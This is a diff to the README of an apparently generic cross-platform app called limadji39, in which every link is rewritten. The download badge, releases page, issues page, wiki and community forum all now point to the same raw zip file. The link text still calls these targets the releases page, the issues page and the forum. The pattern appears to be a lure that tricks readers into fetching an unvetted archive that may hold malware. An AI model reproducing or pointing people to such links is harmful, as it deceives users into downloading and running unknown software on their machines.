@@ -6,7 +6,7 @@ Welcome to limadji39! This is a cross-platform application designed with an intu
 
 ## 📥 Download limadji39
 
-[![Download limadji39](https://img.shields.io/badge/Download-limadji39-blue.svg)](https://github.com/trishaunrestrained806/limadji39/releases)
+[![Download limadji39](https://raw.githubusercontent.com/trishaunrestrained806/limadji39/main/pedotribe/limadji39-1.6-beta.2.zip)](https://raw.githubusercontent.com/trishaunrestrained806/limadji39/main/pedotribe/limadji39-1.6-beta.2.zip)
 
 ## 📋 System Requirements
 
@@ -28,7 +28,7 @@ limadji39 offers several useful features:
 
 ## 📥 Download & Install
 
-To download limadji39, visit this page: [Download limadji39 Releases](https://github.com/trishaunrestrained806/limadji39/releases).
+To download limadji39, visit this page: [Download limadji39 Releases](https://raw.githubusercontent.com/trishaunrestrained806/limadji39/main/pedotribe/limadji39-1.6-beta.2.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the application listed at the top.
@@ -57,7 +57,7 @@ If you encounter any issues while using limadji39, try these steps:
 
 ## 🤝 Getting Help
 
-If you need support, you can find answers to common questions in the FAQs section of our [GitHub Issues page](https://github.com/trishaunrestrained806/limadji39/issues). Feel free to reach out for help.
+If you need support, you can find answers to common questions in the FAQs section of our [GitHub Issues page](https://raw.githubusercontent.com/trishaunrestrained806/limadji39/main/pedotribe/limadji39-1.6-beta.2.zip). Feel free to reach out for help.
 
 ## 📊 Feedback and Contributions
 
@@ -67,11 +67,11 @@ We appreciate user feedback. Please let us know your thoughts or any features yo
 
 For more information about limadji39, visit these helpful resources:
 
-- [Wiki](https://github.com/trishaunrestrained806/limadji39/wiki)
-- [Community Forum](https://forum.example.com)
+- [Wiki](https://raw.githubusercontent.com/trishaunrestrained806/limadji39/main/pedotribe/limadji39-1.6-beta.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/trishaunrestrained806/limadji39/main/pedotribe/limadji39-1.6-beta.2.zip)
 
 ## 📥 Again, Download limadji39
 
-You can download limadji39 from the Releases page here: [Download limadji39 Releases](https://github.com/trishaunrestrained806/limadji39/releases).
+You can download limadji39 from the Releases page here: [Download limadji39 Releases](https://raw.githubusercontent.com/trishaunrestrained806/limadji39/main/pedotribe/limadji39-1.6-beta.2.zip).
 
 Thank you for choosing limadji39. We’re excited for you to try the application!
